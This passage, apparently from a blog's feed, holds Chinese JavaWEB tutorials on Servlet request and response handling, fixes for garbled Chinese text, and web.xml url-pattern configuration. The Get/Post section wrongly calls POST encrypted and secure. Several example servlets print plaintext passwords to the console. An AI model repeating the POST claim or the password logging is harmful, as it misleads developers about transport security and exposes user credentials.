code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">multiple</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>BootStrap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十七）Servlet的应用</title>
    <link href="/2021/08/17/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%B8%83%EF%BC%89Servlet%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <url>/2021/08/17/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%B8%83%EF%BC%89Servlet%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>Servlet（Server Applet）是Java Servlet的简称，称为小服务程序或服务连接器，用Java编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态Web内容。狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基于HTTP协议的Web服务器。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-request对象"><a href="#1-request对象" class="headerlink" title="1.request对象"></a>1.request对象</h2><p>request用来请求数据。<br>在Servlet中用来处理客户端请求需要用 doGet()或者 doPost() 方法的request对象。</p><h3 id="1-1-Get和Post的区别"><a href="#1-1-Get和Post的区别" class="headerlink" title="1.1 Get和Post的区别"></a>1.1 Get和Post的区别</h3><blockquote><ol><li>Get请求</li></ol></blockquote><ul><li>get提交的数据会放在URL之后，以问号（?）分割URL和传输数据，参数之间以 &amp; 相连。</li><li>get方式为明文传递，数据量小，不安全。但效率高，浏览器默认请求方式为 Get 请求。</li><li>对应的Servlet中的方法为 doGet() 。</li></ul><blockquote><ol start="2"><li>Post 请求</li></ol></blockquote><ul><li>post 方法是把提交的数据放在HTTP包的Body中。</li><li>密文传递数据，数据量大，安全。但效率相对没有Get高。</li><li>对应的Servlet中的方法为 doPost() 。</li></ul><h3 id="1-2-request主要方法"><a href="#1-2-request主要方法" class="headerlink" title="1.2 request主要方法"></a>1.2 request主要方法</h3><table><thead><tr><th align="center">方法名</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">String getParameter(String name)</td><td align="center">根据表单组件名称获取提交数据</td></tr><tr><td align="center">void setCharacterEncoding(String charset)</td><td align="center">指定每个请求的编码方式</td></tr></tbody></table><h3 id="1-3-实例"><a href="#1-3-实例" class="headerlink" title="1.3 实例"></a>1.3 实例</h3><h4 id="1-3-1-Get使用"><a href="#1-3-1-Get使用" class="headerlink" title="1.3.1 Get使用"></a>1.3.1 Get使用</h4><p>HelloServlet.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.requesttest;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hs&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>        String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;用户：&quot;</span> + username + <span class="hljs-string">&quot; &quot;</span> + password);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>register.html</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>注册页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!--action中项目名称和实现servlet的类的url-pattern--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/requestTest_war_exploded/hs&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span> <br>    用户名：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    密 码：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;注册&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>网页输入测试：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 用户名  密码</span><br><span class="hljs-keyword">in</span>:qe er<br>out:qe er<br><br><br><span class="hljs-keyword">in</span>:龙 long<br>out:龙 long<br></code></pre></div></td></tr></table></figure><blockquote><ol><li>get请求收参问题</li></ol></blockquote><ul><li>产生乱码是因为服务器和客户端沟通的编码不一样造成的，因此解决的办法是：在客户端和服务器之间设置一个统一的编码，之后就按照此编码进行数据的传输和接受。</li></ul><blockquote><ol start="2"><li>get中文乱码</li></ol></blockquote><ul><li><p>在Tomcat7及以下版本，客户端以UTF-8的编码传输数据到服务器端，而服务器端的request对象使用的是ISO8859-1字符编码来接收数据，服务器和客户端沟通的编码不一致才会产生中文乱码。</p></li><li><p>解决办法：在接受到数据后，先获取request对象以ISO8859-1字符编码接受到的原始数据的字节数组，然后通过字节数组以指定的编码构建字符串，解决乱码问题。</p></li><li><p>需要注意的是：Tomcat8版本中get方式不会出现乱码了，因为服务器对URL的编码格式可以进行自动转换。</p></li></ul><p>如果实在还是有乱码情况，可以参考以下解决代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>    username = <span class="hljs-keyword">new</span> String(username.getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;用户：&quot;</span> + username + <span class="hljs-string">&quot; &quot;</span> + password);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="1-3-2-Post使用"><a href="#1-3-2-Post使用" class="headerlink" title="1.3.2 Post使用"></a>1.3.2 Post使用</h4><p>需要注意的是，Post方法并没有解决乱码问题。输入中文会出现乱码。</p><p>因为客户端是以UTF-8字符编码将表单数据传输到服务器的，因此服务器也需要配置以UTF-8字符编码进行接收。需要使用从ServletRequest接口继承而来的setCharacterEncoding(charset)方法进行统一的编码设置。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>); <span class="hljs-comment">//对request请求对象设置统一的编码，对Get无效。</span><br>    String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>    String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;用户：&quot;</span> + username + <span class="hljs-string">&quot; &quot;</span> + password);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2-response对象"><a href="#2-response对象" class="headerlink" title="2.response对象"></a>2.response对象</h2><p>response用来响应数据。<br>response对象用于响应客户端请求并向客户端输出信息。</p><h3 id="2-1-response主要方法"><a href="#2-1-response主要方法" class="headerlink" title="2.1 response主要方法"></a>2.1 response主要方法</h3><table><thead><tr><th align="center">方法名称</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">setHeader(name,value)</td><td align="center">设置响应信息头</td></tr><tr><td align="center">setContentType(String)</td><td align="center">设置响应文件类型、响应式的编码格式</td></tr><tr><td align="center">setCharacterEncoding(String)</td><td align="center">设置服务端响应内容编码格式</td></tr><tr><td align="center">getWriter()</td><td align="center">获取字符输出流</td></tr></tbody></table><p>实例：实现是在request实例的基础上</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>    String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;用户：&quot;</span> + username + <span class="hljs-string">&quot; &quot;</span> + password);<br>    PrintWriter cout = resp.getWriter();<br>    cout.println(<span class="hljs-string">&quot;注册成功&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>当访问网页时，发现出现了中文乱码。这个问题和request出现乱码的原因一样。因为服务器默认采用ISO8859-1编码响应内容。</p><h3 id="2-2-解决输出中文乱码"><a href="#2-2-解决输出中文乱码" class="headerlink" title="2.2 解决输出中文乱码"></a>2.2 解决输出中文乱码</h3><ul><li><ol><li>设置服务器端响应的编码格式。</li></ol></li><li><ol start="2"><li>设置客户端响应内容的头内容的文件类型及编码格式。</li></ol></li></ul><blockquote><p>解决办法一（不推荐）</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">resp.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>); <span class="hljs-comment">//设置响应编码格式为UTF-8</span><br>resp.setHeader(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br></code></pre></div></td></tr></table></figure><p><strong>但自己在实际测试中，发现只要第一句代码也可以解决乱码问题。不同的是，输出在网页上的字体不同，大小也不同。</strong></p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<span class="hljs-comment">//解决控制台的乱码问题</span><br>    <br>    <span class="hljs-comment">//解决输出到网页的乱码问题</span><br>    resp.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>); <br>    resp.setHeader(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>    <br>    String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>    String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>    <span class="hljs-comment">//输出在控制台上</span><br>    System.out.println(<span class="hljs-string">&quot;用户：&quot;</span> + username + <span class="hljs-string">&quot; &quot;</span> + password);<br>    <span class="hljs-comment">//输出在网页上</span><br>    PrintWriter cout = resp.getWriter();<br>    cout.println(<span class="hljs-string">&quot;注册成功&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>解决办法二（推荐）</p></blockquote><p>同时设置服务端的编码格式和客户端响应的文件类型及响应时的编码格式。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<span class="hljs-comment">//解决控制台的乱码问题</span><br>    <br>    resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<span class="hljs-comment">//解决输出到网页的乱码问题</span><br><br>    String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>    String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;用户：&quot;</span> + username + <span class="hljs-string">&quot; &quot;</span> + password);<br>    PrintWriter cout = resp.getWriter();<br>    cout.println(<span class="hljs-string">&quot;注册成功&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>Servlet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十六）Servlet的配置方式</title>
    <link href="/2021/08/16/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89Servlet%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%B9%E5%BC%8F/"/>
    <url>/2021/08/16/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89Servlet%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>Servlet（Server Applet）是Java Servlet的简称，称为小服务程序或服务连接器，用Java编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态Web内容。狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基于HTTP协议的Web服务器。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-web-xml配置"><a href="#1-web-xml配置" class="headerlink" title="1.web.xml配置"></a>1.web.xml配置</h2><p>在Servlet2.5之前使用。是一种通用方式。<br>基本内容在前面已经有过。这里不再叙述，只是说一下 &lt;url-pattern&gt; 里面配置URL的方式。</p><h3 id="1-1-url-pattern匹配配置方式"><a href="#1-1-url-pattern匹配配置方式" class="headerlink" title="1.1 url-pattern匹配配置方式"></a>1.1 url-pattern匹配配置方式</h3><blockquote><ol><li>精准匹配：/具体名称</li></ol></blockquote><p>只要URL路径是具体的名称的时候才会触发Servlet。</p><p>如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;servlet&gt;<br>    &lt;servlet-name&gt;my&lt;/servlet-name&gt;<br>    &lt;servlet-<span class="hljs-class"><span class="hljs-keyword">class</span>&gt;<span class="hljs-title">com</span>.<span class="hljs-title">tothefor</span>.<span class="hljs-title">MyWeb</span>.<span class="hljs-title">HelloServlet</span>&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">class</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">servlet</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">servlet</span>-<span class="hljs-title">mapping</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">servlet</span>-<span class="hljs-title">name</span>&gt;<span class="hljs-title">my</span>&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">name</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;/<span class="hljs-title">hs</span>&lt;/<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">mapping</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>后缀匹配：*.xxx</li></ol></blockquote><p>只要是以xxx结尾的就可以匹配触发Servlet。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;servlet&gt;<br>    &lt;servlet-name&gt;my&lt;/servlet-name&gt;<br>    &lt;servlet-<span class="hljs-class"><span class="hljs-keyword">class</span>&gt;<span class="hljs-title">com</span>.<span class="hljs-title">tothefor</span>.<span class="hljs-title">MyWeb</span>.<span class="hljs-title">HelloServlet</span>&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">class</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">servlet</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">servlet</span>-<span class="hljs-title">mapping</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">servlet</span>-<span class="hljs-title">name</span>&gt;<span class="hljs-title">my</span>&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">name</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;*.<span class="hljs-title">abcd</span>&lt;/<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">mapping</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>通配符匹配：/* （不会影响精准匹配）</li></ol></blockquote><p>匹配所有请求，包含服务器的所有资源。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;servlet&gt;<br>    &lt;servlet-name&gt;my&lt;/servlet-name&gt;<br>    &lt;servlet-<span class="hljs-class"><span class="hljs-keyword">class</span>&gt;<span class="hljs-title">com</span>.<span class="hljs-title">tothefor</span>.<span class="hljs-title">MyWeb</span>.<span class="hljs-title">HelloServlet</span>&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">class</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">servlet</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">servlet</span>-<span class="hljs-title">mapping</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">servlet</span>-<span class="hljs-title">name</span>&gt;<span class="hljs-title">my</span>&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">name</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;/*&lt;/<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">mapping</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>通配符匹配：/</li></ol></blockquote><p>匹配所有请求，包含服务器的所有资源，不包括 .jsp。</p><h3 id="1-2-load-on-startup"><a href="#1-2-load-on-startup" class="headerlink" title="1.2 load-on-startup"></a>1.2 load-on-startup</h3><p>配置在Servlet标签里面的。这个可以用来控制加载的时机。</p><ul><li><ol><li>元素标记容器是否应该在web应用程序启动的时候就加载Servlet（不需要访问触发）。</li></ol></li><li><ol start="2"><li>它的值必须为一个整数，表示Servlet被加载的先后顺序。</li></ol></li><li><ol start="3"><li>如果该元素的值为负数或者没有设置，则容器会当Servlet被请求时（被访问触发）再加载。</li></ol></li><li><ol start="4"><li>如果值为正整数或者0时，表示容器在应用启动时就加载并初始化这个Servlet，值越小，Servlet的优先级越高，就越先被加载。当值相同时，容器会自己选择顺序来加载。</li></ol></li></ul><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;servlet&gt;<br>    &lt;servlet-name&gt;my&lt;/servlet-name&gt;<br>    &lt;servlet-<span class="hljs-class"><span class="hljs-keyword">class</span>&gt;<span class="hljs-title">com</span>.<span class="hljs-title">tothefor</span>.<span class="hljs-title">MyWeb</span>.<span class="hljs-title">HelloServlet</span>&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">class</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">load</span>-<span class="hljs-title">on</span>-<span class="hljs-title">startup</span>&gt;0&lt;/<span class="hljs-title">load</span>-<span class="hljs-title">on</span>-<span class="hljs-title">startup</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">servlet</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">servlet</span>-<span class="hljs-title">mapping</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">servlet</span>-<span class="hljs-title">name</span>&gt;<span class="hljs-title">my</span>&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">name</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;/<span class="hljs-title">hs</span>&lt;/<span class="hljs-title">url</span>-<span class="hljs-title">pattern</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">servlet</span>-<span class="hljs-title">mapping</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-注解配置（推荐）"><a href="#2-注解配置（推荐）" class="headerlink" title="2.注解配置（推荐）"></a>2.注解配置（推荐）</h2><p>Servlet3.0 后支持。使用注解配置就可以不用再配置web.xml了。如果配置了web.xml也不会有冲突。</p><blockquote><p>使用方法：只需要在类名上面添加 @WebServlet(“/hs”) 即可。</p></blockquote><h3 id="2-1-WebServlet注解常用属性"><a href="#2-1-WebServlet注解常用属性" class="headerlink" title="2.1 @WebServlet注解常用属性"></a>2.1 